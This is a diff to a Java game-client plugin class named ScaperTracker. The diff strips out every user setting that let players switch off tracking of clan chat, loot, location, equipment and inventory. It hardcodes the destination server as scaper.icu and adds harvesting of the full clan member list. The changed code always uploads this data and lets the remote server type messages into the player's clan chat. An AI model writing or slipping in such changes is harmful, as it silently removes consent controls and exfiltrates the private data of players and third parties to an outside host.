@@ -59,6 +59,8 @@ import java.util.regex.Pattern;
 public class ScaperTracker
 {
 	private static final MediaType JSON_TYPE = MediaType.parse("application/json; charset=utf-8");
+	private static final String API_URL = "https://scaper.icu";
+	private static final int TRACKING_INTERVAL_SECONDS = 30;
 
 	// ── Chat message patterns ────────────────────────────────────────────────
 	// "Your Zulrah kill count is: 150."
@@ -79,7 +81,6 @@ public class ScaperTracker
 
 	// ── Dependencies ─────────────────────────────────────────────────────────
 	private final Client client;
-	private final ScaperConfig config;
 	private final OkHttpClient httpClient;
 
 	// ── State ────────────────────────────────────────────────────────────────
@@ -97,10 +98,9 @@ public class ScaperTracker
 	private final List<JsonObject> pendingCollectionLog = new ArrayList<>();
 	private final List<JsonObject> pendingLootDrops = new ArrayList<>();
 
-	public ScaperTracker(Client client, ScaperConfig config, OkHttpClient httpClient)
+	public ScaperTracker(Client client, OkHttpClient httpClient)
 	{
 		this.client = client;
-		this.config = config;
 		this.httpClient = httpClient;
 	}
 
@@ -124,8 +124,6 @@ public class ScaperTracker
 	 */
 	public void onGameTick()
 	{
-		if (!config.trackingEnabled()) return;
-
 		// Auto-detect RSN on first available tick
 		if (cachedRsn == null)
 		{
@@ -143,8 +141,8 @@ public class ScaperTracker
 
 		tickCounter++;
 
-		// Convert config interval (seconds) to ticks (1 tick ≈ 0.6s)
-		int intervalTicks = Math.max(17, (int) Math.ceil(config.trackingIntervalSeconds() / 0.6));
+		// Convert interval (seconds) to ticks (1 tick ≈ 0.6s)
+		int intervalTicks = Math.max(17, (int) Math.ceil(TRACKING_INTERVAL_SECONDS / 0.6));
 
 		if (tickCounter >= intervalTicks)
 		{
@@ -153,7 +151,6 @@ public class ScaperTracker
 		}
 
 		// ── Outbound clan chat: poll API + type one message per tick ─────────
-		if (config.trackClanChat())
 		{
 			outboundPollCounter++;
 			if (outboundPollCounter >= OUTBOUND_POLL_TICKS)
@@ -176,12 +173,12 @@ public class ScaperTracker
 	 */
 	public void onChatMessage(ChatMessage event)
 	{
-		if (cachedRsn == null || !config.trackingEnabled()) return;
+		if (cachedRsn == null) return;
 
 		ChatMessageType type = event.getType();
 
 		// ── Clan chat ─────────────────────────────────────────────────────
-		if (config.trackClanChat() && type == ChatMessageType.CLAN_CHAT)
+		if (type == ChatMessageType.CLAN_CHAT)
 		{
 			JsonObject msg = new JsonObject();
 			msg.addProperty("sender", stripTags(event.getName()));
@@ -194,8 +191,7 @@ public class ScaperTracker
 		}
 
 		// ── Game messages (boss KC, drops, collection log) ────────────────
-		if (config.trackLoot() &&
-			(type == ChatMessageType.GAMEMESSAGE || type == ChatMessageType.SPAM))
+		if (type == ChatMessageType.GAMEMESSAGE || type == ChatMessageType.SPAM)
 		{
 			String text = stripTags(event.getMessage());
 
@@ -294,7 +290,6 @@ public class ScaperTracker
 				payload.addProperty("combatLevel", localPlayer.getCombatLevel());
 
 				// Location
-				if (config.trackLocation())
 				{
 					WorldPoint loc = localPlayer.getWorldLocation();
 					if (loc != null)
@@ -323,13 +318,11 @@ public class ScaperTracker
 			collectSkills(payload);
 
 			// ── Equipment ─────────────────────────────────────────────────
-			if (config.trackEquipment())
 			{
 				collectItemContainer(payload, "equipment", InventoryID.EQUIPMENT);
 			}
 
-			// ── Inventory ─────────────────────────────────────────────────
-			if (config.trackInventory())
+			// ── Inventory ─────────────────────────────────────────────────────
 			{
 				collectItemContainer(payload, "inventory", InventoryID.INVENTORY);
 			}
@@ -438,14 +431,19 @@ public class ScaperTracker
 			JsonObject clan = new JsonObject();
 			clan.addProperty("name", clanSettings.getName());
 
-			// Find our rank in the member list
+			// Find our rank in the member list and capture all member names
 			List<ClanMember> members = clanSettings.getMembers();
 			if (members != null)
 			{
+				JsonArray memberNames = new JsonArray();
 				for (ClanMember member : members)
 				{
-					if (member.getName() != null
-						&& member.getName().equalsIgnoreCase(cachedRsn))
+					if (member.getName() == null) continue;
+
+					// Capture all member names for cross-member verification
+					memberNames.add(member.getName());
+
+					if (member.getName().equalsIgnoreCase(cachedRsn))
 					{
 						ClanRank rank = member.getRank();
 						clan.addProperty("myRankLevel", rank.getRank());
@@ -457,9 +455,9 @@ public class ScaperTracker
 							clan.addProperty("myRankTitle", title.getName());
 							clan.addProperty("myRankIconId", title.getId());
 						}
-						break;
 					}
 				}
+				clan.add("memberNames", memberNames);
 				clan.addProperty("totalMembers", members.size());
 			}
 
@@ -693,7 +691,7 @@ public class ScaperTracker
 		{
 			try
 			{
-				String url = config.apiUrl().replaceAll("/+$", "") + "/api/tracking/snapshot";
+				String url = API_URL + "/api/tracking/snapshot";
 				Request request = new Request.Builder()
 					.url(url)
 					.post(RequestBody.create(JSON_TYPE, json))
@@ -794,7 +792,7 @@ public class ScaperTracker
 		{
 			try
 			{
-				String url = config.apiUrl().replaceAll("/+$", "")
+				String url = API_URL
 					+ "/api/clan-chat/outbound?rsn=" + java.net.URLEncoder.encode(cachedRsn, "UTF-8");
 				Request request = new Request.Builder()
 					.url(url)
